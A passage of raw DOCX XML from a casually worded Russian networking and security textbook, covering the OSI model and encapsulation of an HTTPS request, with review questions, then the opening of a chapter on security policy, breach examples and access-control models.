        <w:t>: У тебя 4 компьютера подключены к хабу. Компьютер A отправляет пакет компьютеру B. Хаб пересылает пакет всем (B, C, D). C и D получают пакет, но отбрасывают его (не их MAC-адрес).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Уровень 2: Свитч (Switch)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делает</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Читает MAC-адрес назначения в кадре → пересылает кадр </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>только на нужный порт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (unicast).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преимущества</w:t>
      </w:r>
      <w:r>
        <w:t>: Нет коллизий, высокая производительность.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: У тебя 4 компьютера подключены к свитчу. Компьютер A отправляет пакет компьютеру B. Свитч смотрит в таблицу MAC-адресов → пересылает кадр только на порт B. C и D ничего не получают.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Уровень 3: Роутер (Router)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делает</w:t>
      </w:r>
      <w:r>
        <w:t>: Читает IP-адрес назначения → определяет маршрут → пересылает пакет на следующий роутер (или хост).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Ты отправляешь пакет на `8.8.8.8` (Google DNS). Роутер смотрит в таблицу маршрутизации: "Этот адрес не в моей сети → отправляю провайдеру". Провайдер пересылает дальше, пока пакет не дойдёт до Google.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Уровень 7: Файрволл (Firewall)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делает</w:t>
      </w:r>
      <w:r>
        <w:t>: Анализирует трафик на уровне приложений → блокирует опасные запросы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Файрволл видит, что кто-то пытается открыть порт 3389 (RDP) из интернета → блокирует (чтобы хакеры не взломали).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.7.12. Практический пример: что происходит при запросе `google.com`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Давай разберём, как все уровни OSI работают вместе, когда ты вводишь `https://google.com` в браузере.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Шаг 1: Уровень 7 (Application) — Формирование HTTP-запроса</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Браузер формирует HTTP-запрос:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>GET / HTTP/1.1</w:t>
        <w:br/>
        <w:t>Host: google.com</w:t>
        <w:br/>
        <w:t>User-Agent: Mozilla/5.0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Шаг 2: Уровень 6 (Presentation) — Шифрование (TLS)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>TLS шифрует HTTP-запрос (HTTPS = HTTP + TLS).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Шаг 3: Уровень 5 (Session) — Управление сессией</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>(обычно ничего не делает в TCP/IP, но можно считать, что TCP управляет соединением)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Шаг 4: Уровень 4 (Transport) — TCP-заголовок</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>TCP добавляет заголовок:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[Source Port: 54321] [Destination Port: 443]</w:t>
        <w:br/>
        <w:t>[Sequence Number] [ACK] [Flags: SYN/ACK/FIN]</w:t>
        <w:br/>
        <w:t>[Зашифрованный HTTP-запрос]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Шаг 5: Уровень 3 (Network) — IP-заголовок</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>IP добавляет заголовок:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[Source IP: 192.168.1.100] [Destination IP: 142.250.185.46]</w:t>
        <w:br/>
        <w:t>[TTL: 64] [Protocol: TCP (6)]</w:t>
        <w:br/>
        <w:t>[TCP-сегмент]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Шаг 6: Уровень 2 (Data Link) — Ethernet-заголовок</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Ethernet добавляет заголовок:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[Destination MAC: роутер 11:22:33:44:55:66]</w:t>
        <w:br/>
        <w:t>[Source MAC: твой компьютер AA:BB:CC:DD:EE:FF]</w:t>
        <w:br/>
        <w:t>[Type: IPv4 (0x0800)]</w:t>
        <w:br/>
        <w:t>[IP-пакет]</w:t>
        <w:br/>
        <w:t>[CRC: контрольная сумма]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Шаг 7: Уровень 1 (Physical) — Передача битов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Кадр преобразуется в электрические сигналы и передаётся по Ethernet-кабелю.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>На стороне роутера</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Роутер получает кадр:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень 1**: Биты → Кадр</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень 2**: Проверяет MAC-адрес → убирает Ethernet-заголовок → передаёт IP-пакет выше</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень 3**: Смотрит Destination IP (`142.250.185.46`) → "Это не в моей сети, пересылаю провайдеру" → добавляет новый Ethernet-заголовок (с MAC-адресом провайдера) → отправляет дальше</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>На стороне сервера Google</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Сервер получает пакет:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень 1**: Биты → Кадр</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень 2**: Проверяет MAC → убирает Ethernet-заголовок</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень 3**: Проверяет IP → убирает IP-заголовок</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень 4**: Проверяет порт (443 = HTTPS) → убирает TCP-заголовок</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень 6**: Расшифровывает TLS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень 7**: Веб-сервер получает HTTP-запрос → формирует ответ (HTML-страница)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Ответ идёт обратно через те же уровни (в обратном порядке).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.7.13. Зачем учить OSI, если используют TCP/IP?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Хороший вопрос. Вот несколько причин:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Терминология**: Когда говорят "протокол уровня 3", все понимают, что речь о маршрутизации (IP). Это универсальный язык.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сертификации**: Cisco CCNA, CompTIA Network+ требуют знания OSI.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Диагностика**: Если сеть не работает, ты проверяешь по уровням:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Уровень 1: Кабель подключён? Сетевая карта работает?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Уровень 2: MAC-адрес правильный? Свитч работает?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Уровень 3: IP-адрес настроен? Роутер доступен?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Уровень 4: Порт открыт? Firewall блокирует?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Уровень 7: Приложение работает?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Понимание архитектуры**: OSI объясняет, как сети **должны** работать. TCP/IP — это частный случай.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t>: Учи OSI для экзамена и терминологии. Используй TCP/IP на практике.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Модель OSI (Open Systems Interconnection)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — эталонная семиуровневая модель сетевого взаимодействия, созданная ISO в 1984 году.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Уровень 1 (Physical)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — передача битов по физической среде (кабели, радиоволны).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Уровень 2 (Data Link)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — передача кадров в локальной сети с использованием MAC-адресов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Уровень 3 (Network)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — маршрутизация пакетов между сетями с использованием IP-адресов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Уровень 4 (Transport)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — доставка данных между приложениями с использованием портов (TCP, UDP).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Уровень 5 (Session)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — управление сессиями (установка, поддержка, завершение).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Уровень 6 (Presentation)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — кодирование, шифрование, сжатие данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Уровень 7 (Application)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — сетевые услуги для приложений пользователя (HTTP, SMTP, FTP).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Инкапсуляция</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — процесс оборачивания данных заголовками на каждом уровне при отправке.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Декапсуляция</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — процесс разворачивания заголовков на каждом уровне при получении.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PDU (Protocol Data Unit)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — единица данных на каждом уровне: бит (Physical), кадр (Data Link), пакет (Network), сегмент/датаграмма (Transport), данные (Application).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Хаб (Hub)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — устройство уровня 1, пересылает биты всем портам (устарело).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Свитч (Switch)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — устройство уровня 2, коммутирует кадры по MAC-адресам.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Роутер (Router)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — устройство уровня 3, маршрутизирует пакеты по IP-адресам.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Файрволл (Firewall)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — устройство уровня 7, фильтрует трафик на основе правил безопасности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Стек TCP/IP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — практическая реализация сетевых протоколов, состоит из 4 уровней (Application, Transport, Internet, Network Access).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>OSI vs TCP/IP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — OSI = 7 уровней (теория), TCP/IP = 4 уровня (практика). Протоколы TCP/IP, терминология OSI.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Перечисли семь уровней модели OSI снизу вверх и опиши, что делает каждый уровень (одним предложением).**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Чем отличаются хаб, свитч и роутер? На каких уровнях OSI они работают?**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое инкапсуляция? Опиши процесс инкапсуляции HTTP-запроса при прохождении через все уровни OSI (от Application до Physical).**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сравни модель OSI и стек TCP/IP. Сколько уровней в каждой модели? Как соотносятся уровни OSI и TCP/IP?**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практическая задача**: Ты отправляешь HTTPS-запрос на `youtube.com`. Опиши, что происходит на каждом уровне OSI (снизу вверх) на **твоём компьютере**, **роутере** и **сервере YouTube**. Какие заголовки добавляются/удаляются на каждом уровне?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Зачем нужна модель OSI, если все используют TCP/IP?** Назови хотя бы три причины.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**На каком уровне OSI работает протокол TCP? UDP? IP? Ethernet? HTTP?**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое PDU (Protocol Data Unit)? Как называется PDU на каждом уровне OSI?** (Подсказка: бит, кадр, пакет, сегмент, данные)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Конец главы 8.7</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 🎉</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Поздравляю, братишка! Ты осилил </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Раздел 8 (Локальные и глобальные сети)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> полностью — все 7 глав! Теперь ты знаешь, как работает интернет от физических кабелей до HTTP-запросов. Впереди последний раздел — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Раздел 9 (Защита информации)</w:t>
      </w:r>
      <w:r>
        <w:t>. Там будет про хакеров, шифрование, атаки и всякую паранойю. Не расслабляйся, осталось ещё 7 глав! 💪</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 9.1. Политика безопасности в компьютерных системах</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение: Почему нельзя просто поставить пароль `123456`?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Окей, братан, вот мы уже разобрали все эти протоколы, сети, базы данных, алгоритмы. Научились делать крутые системы. Но есть нюанс: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>любая система — это мишень</w:t>
      </w:r>
      <w:r>
        <w:t>. Хакеры, скрипт-кидди, конкуренты, просто любопытные школьники — все хотят залезть туда, куда их не просят.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример из жизни</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2013 год — Yahoo: утекло **3 миллиарда** аккаунтов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2017 год — Equifax: утекло 147 миллионов записей (включая номера соцстрахования)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2021 год — Facebook: утекло 533 миллиона номеров телефонов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Твой университет: в 2023 году кто-то взломал базу студентов и выложил оценки в публичный доступ (ну или скоро выложит)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему это происходит?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Потому что </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>безопасность — это не продукт, а процесс</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Нельзя просто "купить антивирус" и забыть. Нужна </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>политика безопасности</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — набор правил, процедур и мер, которые защищают информацию от угроз.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В этой главе мы разберём:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Что такое политика безопасности и зачем она нужна</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>CIA Triad (Конфиденциальность, Целостность, Доступность) — святая троица ИБ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Модели управления доступом (DAC, MAC, RBAC, ABAC)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Организационные и технические меры защиты</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Стандарты (ISO 27001, GDPR, 152-ФЗ)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Реальные примеры политик (пароли, разграничение доступа, реагирование на инциденты)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава связана с:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 9.02 (Криптографические методы)** — шифрование как техническая мера защиты</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 9.03 (Угрозы ИБ)** — от чего защищаемся</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 9.05 (Атаки)** — как нарушают политику безопасности</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 3.01 (ОС)** — разграничение доступа на уровне ОС</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 7.02 (БД)** — защита баз данных, резервное копирование</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.1.1. Понятие политики безопасности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Политика безопасности (ПБ)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>формализованный набор правил</w:t>
      </w:r>
      <w:r>
        <w:t>, определяющих, как организация защищает свою информацию от несанкционированного доступа, изменения, уничтожения или утечки.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проще говоря</w:t>
      </w:r>
      <w:r>
        <w:t>: это документ (или набор документов), где написано:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
